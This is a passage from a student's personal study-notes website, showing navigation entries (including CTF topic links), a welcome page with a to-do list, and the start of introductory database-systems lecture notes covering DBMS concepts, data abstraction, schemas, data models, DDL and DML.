  <a href="#note-cs-cv-lec2" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.5.3 Linear Classifiers
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-cs-cv-lec3" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.5.4 Optimization
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-cs-cv-lec4" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.5.5 Neural Networks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-cs-cv-lec5" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.5.6 Backpropagation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-cs-cv-lec6" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.5.7 Convolutional Neural Networks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-cs-cv-lec7_8" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.5.8 CNN Architectures in history
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-cs-cv-lec9_10" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.5.9 Training Neural Networks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-cs-cv-lec11_12" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.5.10 Software in CV
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-cs-cv-lec13_15" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.5.11 Object Detection
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-cs-cv-lec16" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.5.12 Recurrent Neural Networks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-cs-cv-lec17" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.5.13 Attention
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-cs-cv-lec21" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.5.14 Visualize
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#section-2-4-6" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.6 语言学习
    </span>
  </a>
  
    <nav class="md-nav" aria-label="2.4.6 语言学习">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#note-language" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.6.1 外语学习
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-language-english" class="md-nav__link">
    <span class="md-ellipsis">
      2.4.6.2 English
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#section-2-5" class="md-nav__link">
    <span class="md-ellipsis">
      2.5 🛡️ 安全与竞赛
    </span>
  </a>
  
    <nav class="md-nav" aria-label="2.5 🛡️ 安全与竞赛">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#section-2-5-1" class="md-nav__link">
    <span class="md-ellipsis">
      2.5.1 CTF 竞赛
    </span>
  </a>
  
    <nav class="md-nav" aria-label="2.5.1 CTF 竞赛">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#note-ctf-ctf" class="md-nav__link">
    <span class="md-ellipsis">
      2.5.1.1 浙江大学AAA短学期课程
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-ctf-web" class="md-nav__link">
    <span class="md-ellipsis">
      2.5.1.2 Web
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-ctf-misc" class="md-nav__link">
    <span class="md-ellipsis">
      2.5.1.3 Misc
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-ctf-crypto" class="md-nav__link">
    <span class="md-ellipsis">
      2.5.1.4 Crypto
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-ctf-reverse" class="md-nav__link">
    <span class="md-ellipsis">
      2.5.1.5 Reverse
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#note-ctf-%e7%bb%93%e8%af%be%e5%bf%83%e5%be%97" class="md-nav__link">
    <span class="md-ellipsis">
      2.5.1.6 心得
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#friends" class="md-nav__link">
    <span class="md-ellipsis">
      3 🚀 友情链接
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  



<div id="print-site-page" class="print-site-enumerate-headings print-site-enumerate-figures">
        <section class="print-page">
            <div id="print-page-toc" data-toc-depth="3">
                <nav role='navigation' class='print-page-toc-nav'>
                <h1 class='print-page-toc-title'>Table of Contents</h1>
                </nav>
            </div>
        </section>
        <section class="print-page" id="index" heading-number="1"><p><meta name="msvalidate.01" content="E3D4975511E2569AD8A2D179D5BAFD5D" ></p>
<h1 id="index-71229">欢迎来到71229号港湾 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M256 16c0-7 4.5-13.2 11.2-15.3s13.9.4 17.9 6.1l224 320c3.4 4.9 3.8 11.3 1.1 16.6S502 352 496 352H272c-8.8 0-16-7.2-16-16zm-43.9 80.5c7 1.9 11.9 8.2 11.9 15.5v224c0 8.8-7.2 16-16 16H80c-5.7 0-11-3-13.8-8s-2.9-11-.1-16l128-224c3.6-6.3 11-9.4 18-7.5M5.7 404.3C2.8 394.1 10.5 384 21.1 384h533.8c10.6 0 18.3 10.1 15.4 20.3l-4 14.3C550.7 473.9 500.4 512 443 512H133c-57.4 0-107.7-38.1-123.3-93.3l-4-14.3z"/></svg></span><a class="headerlink" href="#index-71229" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 168 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 1 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 1 分钟</p>
</div>
<div align="center">
  <img align="center" src="https://readme-typing-svg.demolab.com?font=Protest+Revolution&pause=1000&color=F77878FF&background=FFAFDF00&center=true&width=435&lines=My heart, the bird of the wilderness;has found its sky in your eyes."/>
</div>

<p>这里是Kailqq的笔记本，记录了我在学习过程中的一些心得和笔记，希望对你有帮助。</p>
<blockquote>
<p>长期摸鱼，尽量更新</p>
<p>目前共 117 个页面，约 329040 字，4428 行代码。</p>
</blockquote>
<h3 id="index-_1">目前要做什么呢<a class="headerlink" href="#index-_1" title="Permanent link">&para;</a></h3>
<ul class="task-list">
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> 修改域名为note.</li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> 搭建个人主页面(Kailqq.cc)</li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> 将GitHub图床的图片迁移到本地(<em>大工程啊</em>)</li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> 写Git笔记</li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> 将概率论的笔记添加数理统计部分，造福小登(先挖坑不确定要不要写)</li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> 计组笔记补全</li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> 拼搏百天，我要考六级_(:з」∠)_</li>
</ul>
<p><a href="https://kailqq.cc">欢迎来我的主页看看</a></p>
<p><a href="https://github.com/kailqq/kailqq.github.io">源码仓库<span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg></span></a></p></section>
                    <section class='print-page md-section' id='section-2' heading-number='2'>
                        <h1>📚 学习笔记<a class='headerlink' href='#section-2' title='Permanent link'></a>
                        </h1>
                    <section class="print-page" id="note" heading-number="2.1"><h1 id="note-_1">我的笔记<a class="headerlink" href="#note-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 126 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间不到 1 分钟</p>
</div>
<p>用于记录课程内容的笔记，希望能帮助到你.
<img alt="😗" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/1f617.svg" title=":kissing:" /></p>
<h2 id="note-_2">📚 学习笔记导览<a class="headerlink" href="#note-_2" title="Permanent link">&para;</a></h2>
<h3 id="note-_3">🎓 课程笔记<a class="headerlink" href="#note-_3" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="#note-db">数据库系统</a>   </li>
<li><a href="#note-co">计算机组成与设计</a> </li>
<li><a href="#note-ads">高级数据结构与算法分析</a> </li>
<li><a href="#note-arch">计算机体系结构</a></li>
<li><a href="#note-datamarket">数据要素市场</a> </li>
</ul>
<h3 id="note-_4">🔬 数学与物理<a class="headerlink" href="#note-_4" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="#note-la-linear-algebra">线性代数</a></li>
<li><a href="#note-probability">概率论</a> </li>
<li><a href="#note-ma">数学分析</a> </li>
<li><a href="#note-physics">普通物理学二</a> </li>
</ul>
<h3 id="note-_5">💻 自学笔记<a class="headerlink" href="#note-_5" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="#note-cs">自学笔记总览</a> </li>
<li><a href="#note-cs-tms">Missing Semester</a> </li>
<li><a href="#note-cs-cv">计算机视觉</a> </li>
<li><a href="#note-cs-git">Git 版本控制</a> </li>
<li><a href="#note-language">语言学习</a> </li>
</ul>
<h3 id="note-_6">🛡️ 安全与竞赛<a class="headerlink" href="#note-_6" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="#note-ctf-ctf">CTF 竞赛</a> </li>
</ul></section>
                    <section class='print-page md-section' id='section-2-2' heading-number='2.2'>
                        <h1>🎓 课程笔记<a class='headerlink' href='#section-2-2' title='Permanent link'></a>
                        </h1>
                    
                    <section class='print-page md-section' id='section-2-2-1' heading-number='2.2.1'>
                        <h1>数据库系统<a class='headerlink' href='#section-2-2-1' title='Permanent link'></a>
                        </h1>
                    <section class="print-page" id="note-db" heading-number="2.2.1.1"><h1 id="note-db-_1">数据库系统<a class="headerlink" href="#note-db-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 45 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间不到 1 分钟</p>
</div>
<blockquote>
<p>授课教师：<a href="https://dilab-zju.github.io/team.html">陈刚</a></p>
</blockquote>
<ul class="task-list">
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-db-lec1">introduction</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-db-lec2">relation model</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-db-sql">SQL</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-db-er">ER model</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-db-lec7">Relational Database Design</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-db-lec8">Storage and File Structure</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-db-indexing">Index</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-db-query">Query Processing</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-db-optimization">Query Optimization</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-db-transaction">Transaction</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-db-concurrency">Concurrency Control</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-db-recovery">Recovery</a></li>
</ul></section><section class="print-page" id="note-db-lec1" heading-number="2.2.1.2"><h1 id="note-db-lec1-introduction">Introduction<a class="headerlink" href="#note-db-lec1-introduction" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 1544 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 1 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 4 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 5 分钟</p>
</div>
<div class="admonition question">
<p class="admonition-title">What is a Database system</p>
<ul>
<li>Database : A very large, integrated collection of data </li>
<li>Models a real-world enterprise<ul>
<li>Entities (e.g., teams, companies) </li>
<li>Relationships (e.g., The Patriots is playing in The Superbowl) </li>
<li>More recently, also includes active components (e.g., business logic)</li>
</ul>
</li>
<li>A Database Management System (DBMS) is a software system designed to store, manage, and facilitate access to databases<ul>
<li>Provides an interface for users to interact with the database</li>
<li>Hides the implementation details of how the data is stored and maintained</li>
<li>Ensures that the data is consistent and secure</li>
<li>Provides tools for querying and updating the data</li>
<li>Provides tools for managing the database itself (e.g., backup and recovery)</li>
</ul>
</li>
</ul>
</div>
<h2 id="note-db-lec1-purpose-of-database-systems">Purpose of Database Systems<a class="headerlink" href="#note-db-lec1-purpose-of-database-systems" title="Permanent link">&para;</a></h2>
<h3 id="note-db-lec1-applications">Applications<a class="headerlink" href="#note-db-lec1-applications" title="Permanent link">&para;</a></h3>
<p>Data processing and management are the most important fields of computer applications. </p>
<p>So the knowledge of database systems is essential for computer scientists.</p>
<p>Database Applications </p>
<ul>
<li>Banking: all transactions</li>
<li>Airlines: reservations, schedules</li>
<li>Universities:  registration, grades</li>
<li>Sales: customers, products, purchases</li>
<li>Manufacturing: production, inventory, orders, supply chain</li>
<li>Human resources: employee records, salaries, tax deductions </li>
</ul>
<p>Databases touch all aspects of our lives although you don’t see them.</p>
<h3 id="note-db-lec1-characteristics-of-dbms">Characteristics of DBMS<a class="headerlink" href="#note-db-lec1-characteristics-of-dbms" title="Permanent link">&para;</a></h3>
<ul>
<li>Efficiency and scalability in data access. </li>
<li>Reduced application development time. </li>
<li>Data independence (including physical data independence and  logical data independence). </li>
<li>Data integrity and security. </li>
<li>Concurrent access and robustness (i.e., recovery). </li>
</ul>
<h3 id="note-db-lec1-file-processing-system">File-Processing System<a class="headerlink" href="#note-db-lec1-file-processing-system" title="Permanent link">&para;</a></h3>
<p>File-processing system is supported by a conventional Operating System (OS). </p>
<p>New application programs must be written if necessary, and new data files are created as required. But over a long period of time, data files may be in different formats. </p>
<p>Data files are independent each other. </p>
<h4 id="note-db-lec1-drawbacks-of-file-processing-system">Drawbacks of File-Processing System<a class="headerlink" href="#note-db-lec1-drawbacks-of-file-processing-system" title="Permanent link">&para;</a></h4>
<ul>
<li>Data redundancy and inconsistency: Multiple file formats, duplication of information in different files </li>
<li>Difficulty in accessing data:need to write a new program to carry out each task</li>
<li>Data isolation——multiple files and multiple formats cause it difficult to retrieve and share</li>
<li>Integrity problems Integrity constraints  (e.g. account balance &gt; 0) become part of program code </li>
<li>Hard to add new constraints or change existing ones </li>
<li>No atomicity of update :Failures may leave database in an inconsistent state with partial updates carried out( atomicity of update refers to the task should either complete or not happen at all)</li>
<li>Difficult to concurrent access by multiple users <ul>
<li>Concurrent access needed for performance</li>
<li>Uncontrolled concurrent accesses can lead to inconsistencies</li>
<li>Example: Two people reading a balance (say 100) and updating it by withdrawing money (say 50 each) at the same time</li>
</ul>
</li>
<li>Security problems</li>
</ul>
<p>** But Database systems offer solutions to all the above problems！ **</p>
<p><strong>Open source databases</strong></p>
<ul>
<li>
<p><a href="http://www.mysql.com">MySQL</a>: is the most popular open source database for small system on web sites, is a key part of  LAMP (Linux, Apache, MySQL, PHP/Perl/Python), and is a fast growing open source enterprise software stack. </p>
</li>
<li>
<p><a href="http://www.postgresql.org">PostgreSQL</a>: is a highly scalable, open source object-relational database management system, and is originally  developed by the Department of Computer Science, UC Berkeley (called Postgres) </p>
</li>
</ul>
<h2 id="note-db-lec1-view-of-data">View of Data<a class="headerlink" href="#note-db-lec1-view-of-data" title="Permanent link">&para;</a></h2>
<h3 id="note-db-lec1-levels-of-data-abstraction">LEvels of Data Abstraction<a class="headerlink" href="#note-db-lec1-levels-of-data-abstraction" title="Permanent link">&para;</a></h3>
<p>Different usage needs different level of abstraction.</p>
<ul>
<li><em>Physical level</em>:describes how a record is stored</li>
<li><em>Logical level</em>: describes data stored in database,and the relationships among the data on upper level</li>
<li><em>view level</em>:View level: application programs hide details of data types. Note that views can also hide information (e.g., employee’s salary) for security purposes. </li>
</ul>
<figure>
<img alt="" src="../NOTE/DB/img/lec1-1.png" width="400" />

<figcaption>architecture</figcaption>
</figure>
<h4 id="note-db-lec1-schemas-and-instances">Schemas and instances<a class="headerlink" href="#note-db-lec1-schemas-and-instances" title="Permanent link">&para;</a></h4>
<p><strong>Schema</strong>--the structure of the database on different level </p>
<blockquote>
<p>Analogous to type information of a variable in a program </p>
</blockquote>
<ul>
<li>Physical schema: database structure design at the physical level </li>
<li>Logical schema: database structure design at the logical level </li>
<li>Subschema: schema at view level </li>
</ul>
<p><strong>instance</strong>--the actual content of the database at a particular point in time</p>
<blockquote>
<p>Analogous to the value of a variable </p>
</blockquote>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>The relationship between schema and instance is similar to types and variables in programming languages 
(type-schema, variable-instance) 
即schema是数据库中的蓝图或者目录，用于描述其结构和内容，定义数据应该如何存储和组织，instance是其具体的数据</p>
</div>
<h4 id="note-db-lec1-physical-logical-independence">Physical &amp; Logical Independence<a class="headerlink" href="#note-db-lec1-physical-logical-independence" title="Permanent link">&para;</a></h4>
<p><em>Physical data independence</em> – the ability to modify the physical schema without changing the logical schema. </p>
<ul>
<li>Applications depend on the logical schema.</li>
<li>Applications are insulated from how data is structured and stored.</li>
<li>One of the most important benefits of using a DBMS! 
对于物理结构的更改不应该影响到更高级的层面</li>
</ul>
<p><em>Logical data independence</em> – protect application programs from changes in logical structure of data. </p>
<ul>
<li>Logical data independence is hard to achieve as the application programs are heavily dependent on the logical structure of data. </li>
</ul>
<h3 id="note-db-lec1-data-models">Data Models<a class="headerlink" href="#note-db-lec1-data-models" title="Permanent link">&para;</a></h3>
<p>Data model is a collection of conceptual tools for describing </p>
<ul>
<li>data structure</li>
<li>data relationships</li>
<li>data semantics</li>
<li>data constraints </li>
</ul>
<p>Different level of data abstraction needs different data model to describe </p>
<p>common data models</p>
<ul>
<li>Relational model (关系模型)</li>
<li>Database system level model based on tables</li>
<li>Entity-Relationship (实体-联系) data model</li>
<li>Used at requirements analysis level</li>
<li>Object-based data models:</li>
<li>Object-oriented (面向对象数据模型)</li>
<li>Object-relational (对象-关系模型)</li>
<li>Semistructured data model (XML) (半结构化数据模型)</li>
<li>Other older models:</li>
<li>Network model (网状模型)</li>
<li>Hierarchical model (层次模型)</li>
</ul>
<h2 id="note-db-lec1-database-language">Database language<a class="headerlink" href="#note-db-lec1-database-language" title="Permanent link">&para;</a></h2>
<ul>
<li>Data Definition Language (DDL): Specification notation for defining the database schema. </li>
<li>Data Manipulation Language (DML): Language for accessing and manipulating the data organized by appropriate data model. </li>
<li>Data Control Language (DCL) </li>
</ul>
<h3 id="note-db-lec1-ddl">DDL<a class="headerlink" href="#note-db-lec1-ddl" title="Permanent link">&para;</a></h3>
<p>Specifies a database scheme as a set of definitions of relational schema. </p>
<p>Also specifies storage structure, access methods, and consistency constraints. </p>
<p>DDL statements are compiled, resulting in a set of tables stored in a special file called data dictionary. </p>
<p>for example</p>
<div class="language-SQL highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-db-lec1-__codelineno-0-1"></a><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">account</span><span class="w"> </span><span class="p">(</span><span class="n">ccount_number</span><span class="w"> </span><span class="nb">char</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span><span class="w">         </span><span class="n">balance</span><span class="w">  </span><span class="nb">integer</span><span class="p">);</span><span class="w"> </span>
</span></code></pre></div>
<p>Data dictionary contains metadata (i.e., the data about data) about </p>
<ul>
<li>Database schema </li>
<li>Integrity constraints </li>
<li>Primary Key </li>
<li>Referential integrity </li>
<li>Authorization </li>
</ul>
<h3 id="note-db-lec1-dml">DML<a class="headerlink" href="#note-db-lec1-dml" title="Permanent link">&para;</a></h3>
<p>Data Manipulation Language (DML) 
- Retrieve data from the database 
- Insert / delete / update data in the database 
- DML also known as query language </p>
<p>Two classes of DMLs 
- Procedural DML – user specifies what data is required and how to get those data  (e.g., C, Pascal, Java, etc.). 
- Nonprocedural DML – user specifies what data is required without specifying how to get those data  (e.g., SQL, Prolog, etc.). </p>
<p>SQL is the most widely used query language </p>
<h2 id="note-db-lec1-database-design">Database Design<a class="headerlink" href="#note-db-lec1-database-design" title="Permanent link">&para;</a></h2>
